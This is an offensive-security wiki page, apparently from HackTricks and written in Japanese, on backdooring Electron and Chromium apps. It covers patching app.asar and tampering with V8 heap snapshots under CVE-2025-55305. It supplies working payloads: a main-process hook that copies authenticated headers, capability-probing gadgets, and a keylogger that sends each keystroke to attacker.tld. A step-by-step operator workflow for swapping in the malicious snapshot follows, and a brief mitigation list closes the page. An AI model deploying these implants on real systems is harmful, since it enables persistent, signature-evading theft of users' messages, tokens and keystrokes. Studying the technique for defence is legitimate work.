# Electronのローカルコードインジェクションとスナップショットの改ざん

{{#include ../../banners/hacktricks-training.md}}

## Electronのローカルコードインジェクション

ローカルにインストールされたElectronアプリケーションを変更またはインストルメントできる場合、任意のJavaScriptを実行させられる可能性があります。以下を参照してください。


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

ローカルのNode inspectorまたはChromium DevToolsのデバッグサーフェスについては、[Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)を参照してください。

## Post-exploitation: ASAR/メインプロセスへのインプラント

Electronアプリのリソースディレクトリへの**書き込みアクセス**を得た場合、非常に実用的なPost-exploitation手法として、**`app.asar`**（またはアプリが読み込むJSエントリーポイント）にパッチを適用し、ユーザーがアプリを再起動するのを待つ方法があります。レンダラーのみで動作するXSSとは異なり、**メインプロセス**から読み込まれるコードはアプリの**Node.jsランタイム**で実行されるため、通常は**ファイルシステム**へのアクセス、コマンドの起動、Electron APIのフック、認証済みアプリケーション状態の調査が可能です。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

一般的なワークフロー:

1. `app.asar`を展開し、`package.json`の`main`または既存の起動ロジックから実際のブートストラップファイルを特定する。
2. **メインプロセス**に小さなローダー（またはpreload/メインプロセスフック）を追加し、アーカイブを再パッケージする。
3. アプリケーションが再び起動するのを待ち、ユーザーがデスクトップアプリのロックを解除するか認証した後、インプラントを使ってランタイムデータを取得する。

最小限のブートストラップパッチの例:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

実用上の影響:

- **信頼されたクライアントからのデータ窃取**: デスクトップアプリがユーザーのデータを復号または読み込むと、implantは実行時にそのデータを読み取れます。そのため、**E2EE messaging clients**（Signal/Slack/Mattermost）や**vault/secret managers**は、エンドポイント層でも依然として興味深い標的です。
- **セッション/tokenの悪用**: Electron implantsは、実行中のクライアントに公開されるアプリのcookie、bearer token、request header、workspace file、repo credentialを窃取できます（例: 認証済みのVS Code extensionsやGit integrations）。
- **被害者コンテキストを利用したpivoting**: パッチを適用したアプリは、被害者のworkstation経由でrequestをproxyし、raw tokenを窃取するだけでなく、被害者のIP、TLS fingerprint、アプリケーションsessionを再利用できます。

> [!NOTE]
> 標的で**ASAR integrity** / **OnlyLoadAppFromAsar**または強化されたElectron **fuses**が有効になっている場合、別のローカルコード読み込みprimitive（例: fuseの悪用やsnapshot tampering）が必要になることがあります。ローカルimplantの選択肢やfuseの詳細については、macOS固有のinjectionページを参照してください。

## V8 heap snapshot tamperingによるローカルバックドア化（Electron/Chromium）– CVE-2025-55305

ElectronおよびChromiumベースのアプリは、起動時に事前構築されたV8 heap snapshot（v8_context_snapshot.bin、必要に応じてbrowser_v8_context_snapshot.bin）をdeserializeし、各V8 isolate（main、preload、renderer）を初期化します。従来、Electronのintegrity fusesはこれらのsnapshotを実行可能コンテンツとして扱わなかったため、fuseベースのintegrity enforcementとOSのcode-signing checksの両方を回避できました。その結果、ユーザーが書き込み可能なインストール先にあるsnapshotを置き換えることで、署名済みbinaryやASARを変更せずに、アプリ内でステルス性の高い永続的なコード実行が可能でした。<sup>[[2]](#references)</sup>

主なポイント
- Integrity gap: EnableEmbeddedAsarIntegrityValidationとOnlyLoadAppFromAsarはASAR内のアプリJavaScriptを検証しますが、V8 heap snapshotは対象外でした（CVE-2025-55305）。Chromiumも同様にsnapshotのintegrityを検証しません。<sup>[[3]](#references)[[4]](#references)</sup>
- 攻撃の前提条件: アプリのインストールディレクトリへのローカルファイル書き込み。ElectronアプリやChromium browsersがユーザー書き込み可能なパス（例: Windowsの%AppData%\Local、macOSの条件付きで/Applications）にインストールされているシステムでは、よく見られます。
- 影響: 頻繁に使用されるbuiltin（「gadget」）をclobberすることで、任意のisolate内で攻撃者のJavaScriptを確実に実行でき、永続化とcode-signing verificationの回避が可能になります。
- 影響を受ける範囲: Electron apps（fusesが有効な場合も含む）およびユーザー書き込み可能な場所からsnapshotを読み込むChromiumベースのbrowsers。

Chromiumをビルドせずにmalicious snapshotを生成する
- 事前構築済みのelectron/mksnapshotを使ってpayload JSをsnapshotにコンパイルし、アプリのv8_context_snapshot.binを上書きします。<sup>[[5]](#references)[[6]](#references)</sup>

最小限のpayload例（クラッシュを強制して実行を確認する）
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolateを考慮したpayloadのルーティング（mainとrendererで異なるコードを実行）
- main processの検出: process.pid、process.binding()、process.dlopenなどのNode専用グローバルは、main processのisolateで利用できます。
- browser/rendererの検出: alertなどのbrowser専用グローバルは、documentコンテキストで実行すると利用できます。

main processのNode機能を一度だけ調べるgadgetの例
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

Renderer/browser-context のデータ窃取 PoC（例: Slack）
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Operator workflow
1) Array.isArray などの一般的な組み込み機能を上書きする payload.js を作成し、必要に応じて isolate ごとに分岐させる。
2) Chromium のソースなしで snapshot をビルドする:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) 対象アプリケーションの snapshot ファイルを上書きする:
   - v8_context_snapshot.bin (常に使用される)
   - browser_v8_context_snapshot.bin (LoadBrowserProcessSpecificV8Snapshot fuse が使われている場合)
4) アプリケーションを起動する。選択した組み込み機能が使われるたびに gadget が実行される。

Notes and considerations
- 完全性チェック／署名の回避: snapshot ファイルはコード署名チェックでネイティブ実行ファイルとして扱われず、歴史的に Electron の fuses や Chromium の完全性制御の対象にもなっていませんでした。
- 永続化: ユーザーが書き込み可能なインストール先で snapshot を置き換えると、通常はアプリの再起動後も変更が残り、署名済みの正規アプリに見えます。
- Chromium ブラウザー: 同じ改ざん手法は、ユーザーが書き込み可能な場所にインストールされた Chrome／派生ブラウザーにも適用できます。Chrome には別の完全性緩和策がありますが、物理的にローカルで行われる攻撃は脅威モデルの対象外であると明記されています。<sup>[[9]](#references)[[10]](#references)</sup>

Detection and mitigations
- snapshot を実行可能なコンテンツとして扱い、完全性の適用対象に含める (CVE-2025-55305 の修正)。
- 管理者のみが書き込み可能なインストール先を優先する。v8_context_snapshot.bin と browser_v8_context_snapshot.bin のハッシュを記録し、監視する。
- ランタイム初期の組み込み機能の上書きや予期しない snapshot の変更を検出する。デシリアライズされた snapshot が期待値と一致しない場合はアラートを出す。

## References

- [1] [JS-Tap v3: JavaScript implant によるエンドポイントの Post-Exploitation](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [コード完全性チェックを回避し、Signal、1Password、Slack などにローカルでバックドアを仕込む](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron の fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron の ASAR 完全性](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8 カスタム起動 snapshot](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: 署名されていないコードの読み込みを無効化 (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Chrome セキュリティ FAQ: 物理的にローカルで行われる攻撃は対象外](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
